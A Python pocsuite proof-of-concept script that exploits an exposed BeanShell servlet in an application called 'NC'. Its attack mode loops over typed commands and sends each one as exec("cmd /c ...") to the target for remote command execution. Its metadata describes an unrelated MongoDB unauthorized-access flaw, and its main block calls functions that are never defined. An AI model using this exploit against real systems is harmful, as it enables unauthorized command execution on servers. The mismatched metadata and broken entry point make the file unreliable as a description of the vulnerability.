#!/usr/bin/env python3
# -*- coding:utf-8 -*-
from urllib.parse import quote
import sys
from newpoc.api import re, requests, PocBase, Output
from newpoc.cli import POC_QUEUE

RED = '\x1b[1;91m'
BLUE = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'


# result = {
#     # 不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写
#     # [ PoC结果返回规范 ]( https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md#resultstandard )
#     "Result": {
#         "DBInfo": {
#             "Username": "xxx",
#             "Password": "xxx",
#             "Salt": "xxx",
#             "Uid": "xxx",
#             "Groupid": "xxx",
#         },
#         "ShellInfo": {"URL": "xxx", "Content": "xxx"},
#         "FileInfo": {"Filename": "xxx", "Content": "xxx"},
#         "XSSInfo": {"URL": "xxx", "Payload": "xxx"},
#         "AdminInfo": {"Uid": "xxx", "Username": "xxx", "Password": "xxx"},
#         "Database": {
#             "Hostname": "xxx",
#             "Username": "xxx",
#             "Password": "xxx",
#             "DBname": "xxx",
#         },
#         "VerifyInfo": {"URL": "xxx", "Postdata": "xxx", "Path": "xxx"},
#         "SiteAttr": {"Process": "xxx"},
#         "Stdout": "result output string",
#     }
# }


class POC(PocBase):
    vulID = '6789'  # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0
    version = '1'  # 默认为1
    author = 'myxae86'  # PoC 作者的大名
    vulDate = '2021-08-28'  # 漏洞公开的时间，不知道就写今天
    createDate = '2021-08-28'  # 编写 PoC 的日期
    updateDate = '2021-08-29'  # PoC 更新的时间，默认和编写时间一样
    references = ['https://www.freebuf.com/vuls/212799.html']  # 漏洞地址来源，0day 不用写
    name = 'NC_RCE'  # PoC 名称
    appPowerLink = 'https://www.mongodb.com/'  # 漏洞厂商主页地址
    appName = 'NC'  # 漏洞应用名称
    appVersion = '3.0'  # 漏洞影响版本
    vulType = 'Unauthorized Access'  # 漏洞类型，类型参考见漏洞类型规范表
    desc = '''
        MongoDB服务安装后，默认未开启权限验证。如果服务监听在0.0.0.0，并且启动MongoDB服务时不添加任何参数，则可远程无需授权访问数据库
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = ['pymongo']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
        pocsuite -r mongodb_poc.py -u 192.168.1.38 --verify
        pocsuite -r mongodb_poc.py -u 192.168.1.38 --attack
    '''
    output = Output()

    def _verify(self, target_url):
        result = {
            "target-url": '',
            "poc-name": self.name,
            "poc-id": self.vulID,
            "component": self.appName,
            "version": self.appVersion,
            "status": 'ok'
        }
        self.output.check(BLUE + '\n[*]正在检测漏洞是否存在\n' + ENDC)
        url = target_url + '/servlet/~ic/bsh.servlet.BshServlet'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
        }
        try:
            response = requests.get(url=url, headers=headers, timeout=5)
            if response.status_code == 200 and 'BeanShell' in response.text:
                self.output.success(GREEN + '[+]BeanShell页面存在, 可能存在漏洞: {}\n'.format(url) + ENDC)
                result['result'] = url
                POC_QUEUE.put(result)
            else:
                self.output.fail(RED + '[-]漏洞不存在\n' + ENDC)
        except:
            self.output.error(RED + '[-]无法与目标建立连接\n' + ENDC)

    def _attack(self, url):
        print(BLUE + "[*]在command后输入执行命令, 仅适用于Windoes, Linux请手动测试\n" + ENDC)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        while True:
            command = str(input(BOLD + 'command: ' + ENDC))
            data = 'bsh.script=' + quote('''exec("cmd /c {}")'''.format(command.replace('\\', '\\\\')), 'utf-8')
            try:
                response = requests.post(url=url, headers=headers, data=data)
                pattern = re.compile('<pre>(.*?)</pre>', re.S)
                result = re.search(pattern, response.text)
                print(result[0].replace('<pre>', '').replace('</pre>', ''))
            except:
                print(RED + '[-]未知错误\n' + ENDC)
                sys.exit(0)

    def _shell(self):
        pass


if __name__ == '__main__':
    target_url = str(input(BOLD + 'Url: ' + ENDC))
    url = NcCheck(target_url)
    NcRce(url)
